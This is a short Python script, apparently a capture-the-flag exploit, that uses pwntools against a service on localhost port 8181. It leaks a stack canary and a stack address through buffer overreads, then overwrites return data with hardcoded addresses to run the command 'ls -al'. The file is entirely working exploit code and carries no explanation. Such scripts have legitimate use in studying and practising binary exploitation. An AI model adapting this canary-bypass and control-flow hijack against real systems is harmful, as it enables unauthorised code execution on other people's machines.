from pwn import *
import binascii
hexy = lambda x: int(binascii.hexlify(x), 16)

proc = remote("localhost", 8181)
proc.recvuntil('>')
proc.sendline('1')
proc.recvuntil(':')
proc.sendline("a"*40)
sample = proc.recvuntil('>')
canary = sample.split('\n')[1].lstrip('a'*39)
canary = hexy(canary[::-1])<<8
proc.sendline('1')
proc.recvuntil(':')
proc.sendline('aaaa'*12+'aaa')
buf = proc.recvuntil('>').split('\n')[1]
buf = buf[:4][::-1]
buf = hexy(buf) - 292
proc.sendline('1')
proc.recvuntil(':')
payload = p64(hexy("ls -al"[::-1]))
proc.sendline(p32(0x8048b86)*16+p32(0x08048620)+"aaaa"+p64(buf)+p64(hexy("ls -al"[::-1])))
proc.recvuntil('>')
proc.sendline('2')
proc.recvuntil(':')
proc.sendline("a"*40+p64(canary))
proc.recvuntil('>')
proc.sendline('3')
